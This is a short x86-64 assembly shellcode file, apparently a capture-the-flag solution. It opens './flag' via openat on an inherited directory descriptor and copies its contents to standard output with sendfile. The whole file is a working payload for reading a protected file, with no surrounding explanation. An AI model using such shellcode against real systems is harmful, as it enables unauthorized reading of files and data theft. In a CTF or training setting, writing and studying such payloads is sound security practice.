.global _start
_start:
.intel_syntax noprefix
# openat(3, "./flag", 0); // 0 is O_RDONLY
mov rax, 257
mov rdi, 3
lea rsi, [rip+flag]
mov rdx, 0
syscall

# sendfile(1, 4, 0, 0x80);
mov rdi, 1
mov rsi, 4
mov rdx, 0
mov r10, 0x80
mov rax, 40
syscall
flag:
.string "./flag"
